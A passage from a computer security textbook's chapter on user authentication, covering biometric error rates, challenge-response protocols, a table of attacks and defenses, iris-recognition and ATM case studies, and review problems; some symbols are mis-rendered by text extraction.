Identification\\r\\nUser’s identity or\\r\\n“user unidentified” N templates\\r\\nFeature\\r\\nextractor\\r\\nFeature\\r\\nmatcher\\r\\nBiometric\\r\\ndatabase\\r\\nM03_STAL0611_04_GE_C03.indd 112 10/11/17 2:44 PM\\n\\n\\n3.4 / BIOMETRIC AUTHENTICATION 113\\r\\ndensity function typically forming a bell curve, as shown. For example, in the case of a \\r\\nfingerprint, results may vary due to sensor noise; changes in the print due to swelling \\r\\nor dryness; finger placement; and so on. On average, any other individual should have \\r\\na much lower matching score, but again will exhibit a bell-shaped probability density \\r\\nfunction. The difficulty is that the range of matching scores produced by two individu\\ufffeals, one genuine and one an imposter, compared to a given reference template, are \\r\\nlikely to overlap. In Figure 3.10, a threshold value is selected thus that if the presented \\r\\nvalue s Ú t a match is assumed, and for s 6 t, a mismatch is assumed. The shaded part \\r\\nto the right of t indicates a range of values for which a false match is possible, and the \\r\\nshaded part to the left indicates a range of values for which a false nonmatch is pos\\ufffesible. A false match results in the acceptance of a user who should not be accepted, \\r\\nand a false mismatch triggers the rejection of a valid user. The area of each shaded \\r\\npart represents the probability of a false match or nonmatch, respectively. By moving \\r\\nthe threshold, left or right, the probabilities can be altered, but note that a decrease \\r\\nin false match rate results in an increase in false nonmatch rate, and vice versa.\\r\\nFor a given biometric scheme, we can plot the false match versus false nonmatch \\r\\nrate, called the operating characteristic curve. Figure 3.11 shows idealized curves for \\r\\ntwo different systems. The curve that is lower and to the left performs better. The \\r\\ndot on the curve corresponds to a specific threshold for biometric testing. Shifting \\r\\nthe threshold along the curve up and to the left provides greater security and the \\r\\ncost of decreased convenience. The inconvenience comes from a valid user being \\r\\ndenied access and being required to take further steps. A plausible trade-off is to \\r\\nFigure 3.10 Profiles of a Biometric Characteristic of an Imposter and an \\r\\nAuthorized User In this depiction, the comparison between the presented \\r\\nfeature and a reference feature is reduced to a single numeric value. If \\r\\nthe input value (s) is greater than a preassigned threshold (t), a match is \\r\\ndeclared.\\r\\nDecision\\r\\nthreshold (t) Imposter\\r\\nprofile\\r\\nProfile of\\r\\ngenuine user\\r\\nFalse\\r\\nmatch\\r\\npossible\\r\\nFalse\\r\\nnonmatch\\r\\npossible\\r\\nAverage matching Matching score (s)\\r\\nvalue of imposter\\r\\nAverage matching\\r\\nvalue of genuine user\\r\\nProbability\\r\\ndensity function\\r\\nM03_STAL0611_04_GE_C03.indd 113 10/11/17 2:44 PM\\n\\n\\n114 CHAPTER 3 / USER AUTHENTICATION\\r\\npick a threshold that corresponds to a point on the curve where the rates are equal. \\r\\nA high-security application may require a very low false match rate, resulting in a \\r\\npoint farther to the left on the curve. For a forensic application, in which the system \\r\\nis looking for possible candidates, to be checked further, the requirement may be for \\r\\na low false nonmatch rate.\\r\\nFigure 3.12 shows characteristic curves developed from actual product testing. \\r\\nThe iris system had no false matches in over 2 million cross-comparisons. Note that \\r\\nover a broad range of false match rates, the face biometric is the worst performer.\\r\\n3.5 REMOTE USER AUTHENTICATION\\r\\nThe simplest form of user authentication is local authentication, in which a user \\r\\nattempts to access a system that is locally present, such as a stand-alone office PC \\r\\nor an ATM machine. The more complex case is that of remote user authentication, \\r\\nwhich takes place over the Internet, a network, or a communications link. Remote \\r\\nuser authentication raises additional security threats, such as an eavesdropper being \\r\\nFigure 3.11 Idealized Biometric Measurement Operating Characteristic Curves \\r\\n(log-log scale)\\r\\nIncrease threshold\\r\\nIncreased\\r\\nsecurity,\\r\\ndecreased \\r\\nconvenience\\r\\nDecrease threshold\\r\\nDecreased\\r\\nsecurity,\\r\\nincreased\\r\\nconvenience\\r\\n0.0001% 0.001% 0.01% 0.1%\\r\\n100%\\r\\n10%\\r\\n1%\\r\\n0.1%\\r\\n1% 10% 100%\\r\\nFalse match rate\\r\\nFalse nonmatch rate\\r\\nEqual error rate line\\r\\nM03_STAL0611_04_GE_C03.indd 114 10/11/17 2:44 PM\\n\\n\\n3.5 / REMOTE USER AUTHENTICATION 115\\r\\nable to capture a password, or an adversary replaying an authentication sequence \\r\\nthat has been observed.\\r\\nTo counter threats to remote user authentication, systems generally rely on some \\r\\nform of challenge-response protocol. In this section, we present the basic elements \\r\\nof such protocols for each of the types of authenticators discussed in this chapter.\\r\\nPassword Protocol\\r\\nFigure 3.13a provides a simple example of a challenge-response protocol for authen\\ufffetication via password. Actual protocols are more complex, such as Kerberos, to be \\r\\ndiscussed in Chapter 23. In this example, a user first transmits his or her identity to \\r\\nthe remote host. The host generates a random number r, often called a nonce, and \\r\\nreturns this nonce to the user. In addition, the host specifies two functions, h() and \\r\\nf(), to be used in the response. This transmission from host to user is the challenge. \\r\\nThe user’s response is the quantity f(r′, h(P′)), where r′ = r and P′ is the user’s \\r\\npassword. The function h is a hash function, so the response consists of the hash func\\ufffetion of the user’s password combined with the random number using the function f.\\r\\nThe host stores the hash function of each registered user’s password, depicted \\r\\nas h(P(U)) for user U. When the response arrives, the host compares the incom\\ufffeing f(r′, h(P′)) to the calculated f(r, h(P(U))). If the quantities match, the user is \\r\\nauthenticated.\\r\\nThis scheme defends against several forms of attack. The host stores not the \\r\\npassword but a hash code of the password. As discussed in Section 3.2, this secures \\r\\nthe password from intruders into the host system. In addition, not even the hash of the \\r\\npassword is transmitted directly, but rather a function in which the password hash is \\r\\none of the arguments. Thus, for a suitable function f, the password hash cannot be cap\\ufffetured during transmission. Finally, the use of a random number as one of the arguments \\r\\nFigure 3.12 Actual Biometric Measurement Operating Characteristic \\r\\nCurves To clarify differences among systems, a log-log scale is used.\\r\\nSource: From [MANSO1]. Mansfield, T., Gavin Kelly, David Chandler, \\r\\nJan Kane. Biometric Product Testing Final Report. National Physics \\r\\nLaboratory, United Kingdom, March 2001. United Kingdom National \\r\\nArchives, Open Government Licence v3.0.\\r\\n0.0001% 0.001% 0.01% 0.1%\\r\\n0.1%\\r\\nFalse match rate\\r\\nFalse nonmatch rate\\r\\n1%\\r\\n1%\\r\\n10% 100%\\r\\n10%\\r\\nFace Fingerprint Voice Hand Iris 100%\\r\\nM03_STAL0611_04_GE_C03.indd 115 10/11/17 2:45 PM\\n\\n\\n116 CHAPTER 3 / USER AUTHENTICATION\\r\\nof f defends against a replay attack, in which an adversary captures the user’s transmis\\ufffesion and attempts to log on to a system by retransmitting the user’s messages.\\r\\nToken Protocol\\r\\nFigure 3.13b provides a simple example of a token protocol for authentication. As \\r\\nbefore, a user first transmits his or her identity to the remote host. The host returns a \\r\\nFigure 3.13 Basic Challenge-Response Protocols for Remote User Authentication\\r\\nSource: Based on [OGOR03].\\r\\nU\\r\\nHost Client\\r\\nU, User\\r\\nE(r \\', BS\\'(x \\'))\\r\\nE–1E(r \\', BS\\'(x \\')) =\\r\\n(r \\', BS\\'(x \\'))\\r\\nextract B\\'\\r\\nfrom (r \\', BS\\'(x \\'))\\r\\nif r \\' = r AND x \\' = x\\r\\nAND B\\' = B(U)\\r\\nyes/no then yes else no \\r\\n(d) Protocol for dynamic biometric\\r\\nif f(r \\', h(W \\')) =\\r\\nf(r, h(W(U)))\\r\\nthen yes else no yes/no \\r\\n(b) Protocol for a token\\r\\nr, random number\\r\\nx, random sequence\\r\\nchallenge\\r\\nE(), function (r, x, E())\\r\\nf(r \\', h(W \\'))\\r\\n(r, h(), f())\\r\\nB\\', x\\' BS\\'(x \\')\\r\\nr \\', return of r\\r\\nP\\' W \\'\\r\\npassword to\\r\\npasscode via token\\r\\nr \\', return of r\\r\\nU\\r\\nHost Client\\r\\nU, User\\r\\nE(r\\', D \\', BT \\')\\r\\nE–1E(r \\', P\\', BT\\') =\\r\\n(r\\', P\\', BT\\')\\r\\nif r\\' = r AND D\\' = D\\r\\nAND BT\\' = BT(U)\\r\\nthen yes else no yes/no \\r\\n(c) Protocol for static biometric\\r\\nr, random number\\r\\nE(), function (r, E())\\r\\nB\\' BT \\' biometric\\r\\nD \\' biometric device\\r\\nr \\', return of r\\r\\nU\\r\\nHost Client\\r\\nU, User\\r\\nr, random number\\r\\nh(), f(), functions\\r\\nif f(r \\', h(P\\')) =\\r\\nf(r, h(P(U)))\\r\\nthen yes else no yes/no \\r\\n(a) Protocol for a password\\r\\nf(r \\', h(P\\'))\\r\\n(r, h(), f())\\r\\nP\\'\\r\\nr \\', return of r\\r\\nU\\r\\nHost Client\\r\\nU, User\\r\\nr, random number\\r\\nh(), f(), functions\\r\\nM03_STAL0611_04_GE_C03.indd 116 10/11/17 2:45 PM\\n\\n\\n3.6 / SECURITY ISSUES FOR USER AUTHENTICATION 117\\r\\nrandom number and the identifiers of functions f() and h() to be used in the response. \\r\\nAt the user end, the token provides a passcode W′. The token either stores a static \\r\\npasscode or generates a one-time random passcode. For a one-time random pass\\ufffecode, the token must be synchronized in some fashion with the host. In either case, \\r\\nthe user activates the passcode by entering a password P′. This password is shared \\r\\nonly between the user and the token and does not involve the remote host. The \\r\\ntoken responds to the host with the quantity f(r′, h(W′)). For a static passcode, the \\r\\nhost stores the hashed value h(W(U)); for a dynamic passcode, the host generates a \\r\\none-time passcode (synchronized to that generated by the token) and takes its hash. \\r\\nAuthentication then proceeds in the same fashion as for the password protocol.\\r\\nStatic Biometric Protocol\\r\\nFigure 3.13c is an example of a user authentication protocol using a static biometric. \\r\\nAs before, the user transmits an ID to the host, which responds with a random num\\ufffeber r and, in this case, the identifier for an encryption E(). On the user side is a client \\r\\nsystem that controls a biometric device. The system generates a biometric template \\r\\nBT′ from the user’s biometric B′ and returns the ciphertext E(r′, D′, BT′), where D′\\r\\nidentifies this particular biometric device. The host decrypts the incoming message to \\r\\nrecover the three transmitted parameters and compares these to locally stored values. \\r\\nFor a match, the host must find r′ = r. Also, the matching score between BT′ and \\r\\nthe stored template must exceed a predefined threshold. Finally, the host provides \\r\\na simple authentication of the biometric capture device by comparing the incoming \\r\\ndevice ID to a list of registered devices at the host database.\\r\\nDynamic Biometric Protocol\\r\\nFigure 3.13d is an example of a user authentication protocol using a dynamic biomet\\uffferic. The principal difference from the case of a stable biometric is that the host pro\\ufffevides a random sequence as well as a random number as a challenge. The sequence \\r\\nchallenge is a sequence of numbers, characters, or words. The human user at the client \\r\\nend must then vocalize (speaker verification), type (keyboard dynamics verifica\\ufffetion), or write (handwriting verification) the sequence to generate a biometric signal \\r\\nBS′(x′). The client side encrypts the biometric signal and the random number. At \\r\\nthe host side, the incoming message is decrypted. The incoming random number r′\\r\\nmust be an exact match to the random number that was originally used as a challenge \\r\\n(r). In addition, the host generates a comparison based on the incoming biometric \\r\\nsignal BS′(x′), the stored template BT(U) for this user and the original signal x. If \\r\\nthe comparison value exceeds a predefined threshold, the user is authenticated.\\r\\n3.6 SECURITY ISSUES FOR USER AUTHENTICATION\\r\\nAs with any security service, user authentication, particularly remote user authen\\ufffetication, is subject to a variety of attacks. Table 3.5, from [OGOR03], summarizes \\r\\nthe principal attacks on user authentication, broken down by type of authenticator. \\r\\nMuch of the table is self-explanatory. In this section, we expand on some of the table’s \\r\\nentries.\\r\\nM03_STAL0611_04_GE_C03.indd 117 10/11/17 2:45 PM\\n\\n\\n118 CHAPTER 3 / USER AUTHENTICATION\\r\\nAttacks Authenticators Examples Typical Defenses\\r\\nClient attack\\r\\nPassword Guessing, exhaustive \\r\\nsearch\\r\\nLarge entropy; limited attempts\\r\\nToken Exhaustive search Large entropy; limited attempts; \\r\\ntheft of object requires \\r\\npresence\\r\\nBiometric False match Large entropy; limited \\r\\nattempts\\r\\nHost attack\\r\\nPassword Plaintext theft, \\r\\ndictionary/exhaustive \\r\\nsearch\\r\\nHashing; large entropy; \\r\\nprotection of password \\r\\ndatabase\\r\\nToken Passcode theft Same as password; 1-time \\r\\npasscode\\r\\nBiometric Template theft Capture device authentication; \\r\\nchallenge response\\r\\nEavesdropping, \\r\\ntheft, and \\r\\ncopying\\r\\nPassword “Shoulder surfing” User diligence to keep secret; \\r\\nadministrator diligence to quickly \\r\\nrevoke compromised passwords; \\r\\nmultifactor authentication\\r\\nToken Theft, counterfeiting \\r\\nhardware\\r\\nMultifactor authentication; tamper \\r\\nresistant/evident token\\r\\nBiometric Copying (spoofing) \\r\\nbiometric\\r\\nCopy detection at capture device \\r\\nand capture device \\r\\nauthentication\\r\\nReplay\\r\\nPassword Replay stolen password \\r\\nresponse\\r\\nChallenge-response protocol\\r\\nToken Replay stolen passcode \\r\\nresponse\\r\\nChallenge-response protocol; \\r\\n1-time passcode\\r\\nBiometric Replay stolen biometric \\r\\ntemplate response\\r\\nCopy detection at capture \\r\\ndevice and capture device \\r\\nauthentication via challenge\\uffferesponse protocol\\r\\nTrojan horse Password, token, \\r\\nbiometric\\r\\nInstallation of rogue \\r\\nclient or capture device\\r\\nAuthentication of client or \\r\\ncapture device within trusted \\r\\nsecurity perimeter\\r\\nDenial \\r\\nof service\\r\\nPassword, token, \\r\\nbiometric\\r\\nLockout by multiple \\r\\nfailed authentications\\r\\nMultifactor with token\\r\\nTable 3.5 Some Potential Attacks, Susceptible Authenticators, and Typical Defenses\\r\\nClient attacks are those in which an adversary attempts to achieve user authen\\ufffetication without access to the remote host or to the intervening communications \\r\\npath. The adversary attempts to masquerade as a legitimate user. For a password\\ufffebased system, the adversary may attempt to guess the likely user password. Multiple \\r\\nguesses may be made. At the extreme, the adversary sequences through all possible \\r\\npasswords in an exhaustive attempt to succeed. One way to thwart such an attack is \\r\\nto select a password that is both lengthy and unpredictable. In effect, such a password \\r\\nM03_STAL0611_04_GE_C03.indd 118 10/11/17 2:45 PM\\n\\n\\n3.7 / PRACTICAL APPLICATION: AN IRIS BIOMETRIC SYSTEM 119\\r\\nhas large entropy; that is, many bits are required to represent the password. Another \\r\\ncountermeasure is to limit the number of attempts that can be made in a given time \\r\\nperiod from a given source.\\r\\nA token can generate a high-entropy passcode from a low-entropy PIN or pass\\ufffeword, thwarting exhaustive searches. The adversary may be able to guess or acquire \\r\\nthe PIN or password, but must additionally acquire the physical token to succeed.\\r\\nHost attacks are directed at the user file at the host where passwords, token \\r\\npasscodes, or biometric templates are stored. Section 3.2 discusses the security consid\\ufffeerations with respect to passwords. For tokens, there is the additional defense of using \\r\\none-time passcodes, so passcodes are not stored in a host passcode file. Biometric \\r\\nfeatures of a user are difficult to secure because they are physical features of the user. \\r\\nFor a static feature, biometric device authentication adds a measure of protection. For \\r\\na dynamic feature, a challenge-response protocol enhances security.\\r\\nEavesdropping in the context of passwords refers to an adversary’s attempt \\r\\nto learn the password by observing the user, finding a written copy of the password, \\r\\nor some similar attack that involves the physical proximity of user and adversary. \\r\\nAnother form of eavesdropping is keystroke logging (keylogging), in which malicious \\r\\nhardware or software is installed so that the attacker can capture the user’s keystrokes \\r\\nfor later analysis. A system that relies on multiple factors (e.g., password plus token \\r\\nor password plus biometric) is resistant to this type of attack. For a token, an analo\\ufffegous threat is theft of the token or physical copying of the token. Again, a multifactor \\r\\nprotocol resists this type of attack better than a pure token protocol. The analogous \\r\\nthreat for a biometric protocol is copying or imitating the biometric parameter so as \\r\\nto generate the desired template. Dynamic biometrics are less susceptible to such \\r\\nattacks. For static biometrics, device authentication is a useful countermeasure.\\r\\nReplay attacks involve an adversary repeating a previously captured user \\r\\nresponse. The most common countermeasure to such attacks is the challenge-response \\r\\nprotocol.\\r\\nIn a Trojan horse attack, an application or physical device masquerades as an \\r\\nauthentic application or device for the purpose of capturing a user password, pass\\ufffecode, or biometric. The adversary can then use the captured information to masquer\\ufffeade as a legitimate user. A simple example of this is a rogue bank machine used to \\r\\ncapture user ID/password combinations.\\r\\nA denial-of-service attack attempts to disable a user authentication service by \\r\\nflooding the service with numerous authentication attempts. A more selective attack \\r\\ndenies service to a specific user by attempting logon until the threshold is reached \\r\\nthat causes lockout to this user because of too many logon attempts. A multifactor \\r\\nauthentication protocol that includes a token thwarts this attack, because the adver\\ufffesary must first acquire the token.\\r\\n3.7 PRACTICAL APPLICATION: AN IRIS BIOMETRIC SYSTEM\\r\\nAs an example of a biometric user authentication system, we look at an iris biometric \\r\\nsystem that was developed for use by the United Arab Emirates (UAE) at border \\r\\ncontrol points [DAUG04, TIRO05, NBSP08]. The UAE relies heavily on an outside \\r\\nworkforce, and has increasingly become a tourist attraction. Accordingly, relative to \\r\\nM03_STAL0611_04_GE_C03.indd 119 10/11/17 2:45 PM\\n\\n\\n120 CHAPTER 3 / USER AUTHENTICATION\\r\\nits size, the UAE has a very substantial volume of incoming visitors. On a typical day, \\r\\nmore than 6,500 passengers enter the UAE via seven international airports, three \\r\\nland ports, and seven sea ports. Handling a large volume of incoming visitors in an \\r\\nefficient and timely manner thus poses a significant security challenge. Of particular \\r\\nconcern to the UAE are attempts by expelled persons to re-enter the country. Tra\\ufffeditional means of preventing reentry involve identifying individuals by name, date \\r\\nof birth, and other text-based data. The risk is that this information can be changed \\r\\nafter expulsion. An individual can arrive with a different passport with a different \\r\\nnationality and changes to other identifying information.\\r\\nTo counter such attempts, the UAE decided on using a biometric identification \\r\\nsystem and identified the following requirements:\\r\\n• Identify a single person from a large population of people.\\r\\n• Rely on a biometric feature that does not change over time.\\r\\n• Use biometric features that can be acquired quickly.\\r\\n• Be easy to use.\\r\\n• Respond in real-time for mass transit applications.\\r\\n• Be safe and non-invasive.\\r\\n• Scale into the billions of comparisons and maintain top performance.\\r\\n• Be affordable.\\r\\nIris recognition was chosen as the most efficient and foolproof method. No two irises \\r\\nare alike. There is no correlation between the iris patterns of even identical twins, or \\r\\nthe right and left eye of an individual.\\r\\nSystem implementation involves enrollment and identity checking. All expelled \\r\\nforeigners are subjected to an iris scan at one of the multiple enrollment centers. This \\r\\ninformation is merged into one central database. Iris scanners are installed at all 17 \\r\\nair, land, and sea ports into the UAE. An iris-recognition camera takes a black-and\\ufffewhite picture 5 to 24 inches from the eye, depending on the camera. The camera uses \\r\\nnon-invasive, near-infrared illumination that is similar to a TV remote control, barely \\r\\nvisible and considered extremely safe. The picture first is processed by software that \\r\\nlocalizes the inner and outer boundaries of the iris, and the eyelid contours, in order \\r\\nto extract just the iris portion. The software creates a so-called phase code for the \\r\\ntexture of the iris, similar to a DNA sequence code. The unique features of the iris \\r\\nare captured by this code and can be compared against a large database of scanned \\r\\nirises to make a match. Over a distributed network (see Figure 3.14) the iris codes \\r\\nof all arriving passengers are compared in realtime exhaustively against an enrolled \\r\\ncentral database.\\r\\nNote this is computationally a more demanding task than verifying an identity. \\r\\nIn this case, the iris pattern of each incoming passenger is compared against the \\r\\nentire database of known patterns to determine if there is a match. Given the current \\r\\nvolume of traffic and size of the database, the daily number of iris cross-comparisons \\r\\nis well over 9 billion.\\r\\nAs with any security system, adversaries are always looking for countermeas\\ufffeures. UAE officials had to adopt new security methods to detect if an iris has been \\r\\ndilated with eye drops before scanning. Expatriates who were banned from the UAE \\r\\nM03_STAL0611_04_GE_C03.indd 120 10/11/17 2:45 PM\\n\\n\\n3.8 / CASE STUDY: SECURITY PROBLEMS FOR ATM SYSTEMS 121\\r\\nstarted using eye drops in an effort to fool the government’s iris recognition system \\r\\nwhen they try to re-enter the country. A new algorithm and computerized step-by\\ufffestep procedure has been adopted to help officials determine if an iris is in normal \\r\\ncondition or an eye-dilating drop has been used.\\r\\n3.8 CASE STUDY: SECURITY PROBLEMS FOR ATM SYSTEMS\\r\\nRedspin, Inc., an independent auditor, released a report describing a security vulner\\ufffeability in ATM (automated teller machine) usage that affected a number of small to \\r\\nmid-size ATM card issuers. This vulnerability provides a useful case study illustrating \\r\\nthat cryptographic functions and services alone do not guarantee security; they must \\r\\nbe properly implemented as part of a system.\\r\\nWe begin by defining terms used in this section are as follows:\\r\\n• Cardholder: An individual to whom a debit card is issued. Typically, this indi\\ufffevidual is also responsible for payment of all charges made to that card.\\r\\nFigure 3.14 General Iris Scan Site Architecture for UAE System\\r\\nIris workstation\\r\\nIris Engine 1 Iris Engine 2\\r\\nIris merge\\r\\nremote\\r\\nIris\\r\\nscanner\\r\\nIris workstation\\r\\nLAN switch\\r\\nNetwork\\r\\nswitch\\r\\nIris\\r\\nscanner\\r\\nIris workstation\\r\\nIris\\r\\nscanner\\r\\nIris\\r\\ndatabase\\r\\nM03_STAL0611_04_GE_C03.indd 121 10/11/17 2:45 PM\\n\\n\\n122 CHAPTER 3 / USER AUTHENTICATION\\r\\n• Issuer: An institution that issues debit cards to cardholders. This institution is \\r\\nresponsible for the cardholder’s account and authorizes all transactions. Banks \\r\\nand credit unions are typical issuers.\\r\\n• Processor: An organization that provides services such as core data processing \\r\\n(PIN recognition and account updating), electronic funds transfer (EFT), and so \\r\\non to issuers. EFT allows an issuer to access regional and national networks that \\r\\nconnect point of sale (POS) devices and ATMs worldwide. Examples of process\\ufffeing companies include Fidelity National Financial and Jack Henry & Associates.\\r\\nCustomers expect 24/7 service at ATM stations. For many small to mid-sized \\r\\nissuers, it is more cost-effective for contract processors to provide the required data \\r\\nprocessing and EFT/ATM services. Each service typically requires a dedicated data \\r\\nconnection between the issuer and the processor, using a leased line or a virtual \\r\\nleased line.\\r\\nPrior to about 2003, the typical configuration involving issuer, processor, and \\r\\nATM machines could be characterized by Figure 3.15a. The ATM units linked directly \\r\\nto the processor rather than to the issuer that owned the ATM, via leased or virtual \\r\\nleased line. The use of a dedicated link made it difficult to maliciously intercept \\r\\nFigure 3.15 ATM Architectures Most small to mid-sized issuers of debit cards con\\ufffetract processors to provide core data processing and electronic funds transfer (EFT) \\r\\nservices. The bank’s ATM machine may link directly to the processor or to the bank.\\r\\nInternet\\r\\n(a) Point-to-point connection to processor\\r\\n(b) Shared connection to processor \\r\\nProcessor\\r\\n(e.g., Fidelity)\\r\\nEFT exchange Issuer’s e.g., Star, VISA internal network\\r\\nIssuer-owned ATM\\r\\nInternet\\r\\nIssuer\\r\\n(e.g., bank)\\r\\nIssuer-owned ATM\\r\\nProcessor\\r\\n(e.g., Fidelity)\\r\\nEFT exchange\\r\\ne.g., Star, VISA\\r\\nIssuer\\r\\n(e.g., bank)\\r\\nM03_STAL0611_04_GE_C03.indd 122 10/11/17 2:45 PM\\n\\n\\n3.8 / CASE STUDY: SECURITY PROBLEMS FOR ATM SYSTEMS 123\\r\\ntransferred data. To add to the security, the PIN portion of messages transmitted from \\r\\nATM to processor was encrypted using DES (Data Encryption Standard). Proces\\ufffesors have connections to EFT (electronic funds transfer) exchange networks to allow \\r\\ncardholders access to accounts from any ATM. With the configuration of Figure 3.15a, \\r\\na transaction proceeds as follows. A user swipes his or her card and enters his or her \\r\\nPIN. The ATM encrypts the PIN and transmits it to the processor as part of an autho\\uffferization request. The processor updates the customer’s information and sends a reply.\\r\\nIn the early 2000s, banks worldwide began the process of migrating from an \\r\\nolder generation of ATMs using IBM’s OS/2 operating system to new systems run\\ufffening Windows. The mass migration to Windows has been spurred by a number of \\r\\nfactors, including IBM’s decision to stop supporting OS/2 by 2006, market pressure \\r\\nfrom creditors such as MasterCard International and Visa International to introduce \\r\\nstronger Triple DES, and pressure from U.S. regulators to introduce new features for \\r\\ndisabled users. Many banks, such as those audited by Redspin, included a number of \\r\\nother enhancements at the same time as the introduction of Windows and triple DES, \\r\\nespecially the use of TCP/IP as a network transport.\\r\\nBecause issuers typically run their own Internet-connected local area networks \\r\\n(LANs) and intranets using TCP/IP, it was attractive to connect ATMs to these issuer \\r\\nnetworks and maintain only a single dedicated line to the processor, leading to the \\r\\nconfiguration illustrated in Figure 3.15b. This configuration saves the issuer expen\\ufffesive monthly circuit fees and enables easier management of ATMs by the issuer. In \\r\\nthis configuration, the information sent from the ATM to the processor traverses \\r\\nthe issuer’s network before being sent to the processor. It is during this time on the \\r\\nissuer’s network that the customer information is vulnerable.\\r\\nThe security problem was that with the upgrade to a new ATM OS and a new \\r\\ncommunications configuration, the only security enhancement was the use of triple \\r\\nDES rather than DES to encrypt the PIN. The rest of the information in the ATM \\r\\nrequest message is sent in the clear. This includes the card number, expiration date, \\r\\naccount balances, and withdrawal amounts. A hacker tapping into the bank’s network, \\r\\neither from an internal location or from across the Internet potentially would have \\r\\ncomplete access to every single ATM transaction.\\r\\nThe situation just described leads to two principal vulnerabilities:\\r\\n• Confidentiality: The card number, expiration date, and account balance can \\r\\nbe used for online purchases or to create a duplicate card for signature-based \\r\\ntransactions.\\r\\n• Integrity: There is no protection to prevent an attacker from injecting or alter\\ufffeing data in transit. If an adversary is able to capture messages en route, the \\r\\nadversary can masquerade as either the processor or the ATM. Acting as the \\r\\nprocessor, the adversary may be able to direct the ATM to dispense money \\r\\nwithout the processor ever knowing that a transaction has occurred. If an adver\\ufffesary captures a user’s account information and encrypted PIN, the account is \\r\\ncompromised until the ATM encryption key is changed, enabling the adversary \\r\\nto modify account balances or effect transfers.\\r\\nRedspin recommended a number of measures that banks can take to coun\\ufffeter these threats. Short-term fixes include segmenting ATM traffic from the rest of \\r\\nM03_STAL0611_04_GE_C03.indd 123 10/11/17 2:45 PM\\n\\n\\n124 CHAPTER 3 / USER AUTHENTICATION\\r\\nthe network either by implementing strict firewall rule sets or physically dividing \\r\\nthe networks altogether. An additional short-term fix is to implement network-level \\r\\nencryption between routers that the ATM traffic traverses.\\r\\nLong-term fixes involve changes in the application-level software. Protecting \\r\\nconfidentiality requires encrypting all customer-related information that traverses \\r\\nthe network. Ensuring data integrity requires better machine-to-machine authenti\\ufffecation between the ATM and processor and the use of challenge-response protocols \\r\\nto counter replay attacks.\\r\\n3.9 KEY TERMS, REVIEW QUESTIONS, AND PROBLEMS\\r\\nKey Terms\\r\\nbiometric\\r\\nchallenge-response protocol\\r\\nclaimant\\r\\ncredential\\r\\ncredential service provider \\r\\n(CSP)\\r\\ndynamic biometric\\r\\nenroll\\r\\nhashed password\\r\\nidentification\\r\\nmemory card\\r\\nnonce\\r\\npassword\\r\\nrainbow table\\r\\nregistration authority (RA)\\r\\nrelying party (RP)\\r\\nsalt\\r\\nshadow password file\\r\\nsmart card\\r\\nstatic biometric\\r\\nsubscriber\\r\\ntoken\\r\\nuser authentication\\r\\nverification\\r\\nverifier\\r\\nReview Questions\\r\\n3.1 In general terms, what are four means of authenticating a user’s identity?\\r\\n3.2 List and briefly describe the principal threats to the secrecy of passwords.\\r\\n3.3 What is the significance of a shadow password file?\\r\\n3.4 Explain how the proactive password checker approach can improve password security.\\r\\n3.5 How can we classify the authentication protocols used with smart tokens?\\r\\n3.6 List and briefly describe the principal physical characteristics used for biometric \\r\\nidentification.\\r\\n3.7 In the context of biometric user authentication, explain the terms, enrollment, verifi\\ufffecation, and identification.\\r\\n3.8 How does remote user authentication differ from local authentication? Which one \\r\\nraised more security threats?\\r\\n3.9 What is a Trojan horse attack?\\r\\nProblems\\r\\n3.1 Explain the suitability or unsuitability of the following passwords:\\r\\na. qwerty b. Einstein c. wysiwyg (for “what you see is d. drowssap\\r\\n what you get”)\\r\\ne. KVK 919 f. Florida g. *laptop_admin# h. cr@zyp@ss\\r\\n3.2 An early attempt to force users to use less predictable passwords involved \\r\\ncomputer-supplied passwords. These passwords were generated using a pseudorandom \\r\\nM03_STAL0611_04_GE_C03.indd 124 10/11/17 2:45 PM\\n\\n\\n3.9 / KEY TERMS, REVIEW QUESTIONS, AND PROBLEMS 125\\r\\nnumber generator. Suppose the passwords were nine-character long and were taken \\r\\nfrom the character set consisting of uppercase letters and digits so that the adversary \\r\\nhas to search through all character strings of length 9 from a 36-character alphabet. \\r\\nWould a pseudorandom number generator with 216 possible starting values suffice? If \\r\\nyes, how? If not, then what should be the appropriate range for this pseudorandom \\r\\nnumber generator?\\r\\n3.3 Assume that Personal Identification Numbers (PINs) are formed by nine-digit com\\ufffebinations of numbers 0 to 9. Assume that an adversary is able to attempt three PINs \\r\\nper second.\\r\\na. Assuming no feedback to the adversary until each attempt has been completed,\\r\\nwhat is the expected time to discover the correct PIN?\\r\\nb. Assuming feedback to the adversary flagging an error as each incorrect digit is \\r\\nentered, what is the expected time to discover the correct PIN?\\r\\n3.4 Assume source elements of length k are mapped in some uniform fashion into a tar\\ufffeget elements of length p. If each digit can take on one of r values, then the number \\r\\nof source elements is r k\\r\\n and the number of target elements is the smaller number r p\\r\\n.\\r\\nA particular source element xi\\r\\n is mapped to a particular target element yj\\r\\n.\\r\\na. What is the probability that the correct source element can be selected by an \\r\\nadversary on one try?\\r\\nb. What is the probability that a different source element xk (xi ≠ xk) that results in \\r\\nthe same target element, yj, could be produced by an adversary?\\r\\nc. What is the probability that the correct target element can be produced by an \\r\\nadversary on one try?\\r\\n3.5 A phonetic password generator picks two segments randomly for each six-letter pass\\ufffeword. The form of each segment is CVC (consonant, vowel, consonant), where \\r\\nV = 6 a, e, i, o, u 7 and C = V.\\r\\na. What is the total password population?\\r\\nb. What is the probability of an adversary guessing a password correctly?\\r\\n3.6 Assume that credit card numbers are limited to the use of the 10 digits and that all \\r\\nnumbers are 16 digits in length. Assume that an adversary needs around 31.69 years of \\r\\ntime to test exhaustively all the possible credit card numbers. What is the rate at which \\r\\nthe adversary is testing these numbers?\\r\\n3.7 The NVIDIA Tesla K-20X GPU has 2688 cores, each operating at a 732-MHz fre\\ufffequency. Further, the GPU has 6 GB of DRAM with a bandwidth of 250 GB/sec that \\r\\nis shared among all the cores. If a password hashing scheme (PHS) takes 2 ms to com\\ufffepute a password:\\r\\na. How many passwords can be tested by the GPU in one hour if the PHS consumes \\r\\nno memory?\\r\\nb. How many cores can work simultaneously if each hash computation requires 20 \\r\\nMB of DRAM? How many passwords can now be tested by the GPU in one hour?\\r\\n3.8 The inclusion of the salt in the UNIX password scheme increases the difficulty of \\r\\nguessing by a factor of 4096. But the salt is stored in plaintext in the same entry as the \\r\\ncorresponding ciphertext password. Therefore, those two characters are known to the \\r\\nattacker and need not be guessed. Why is it asserted that the salt increases security?\\r\\n3.9 Assuming you have successfully answered the preceding problem and understand the \\r\\nsignificance of the salt, here is another question. Wouldn’t it be possible to thwart com\\ufffepletely all password crackers by dramatically increasing the salt 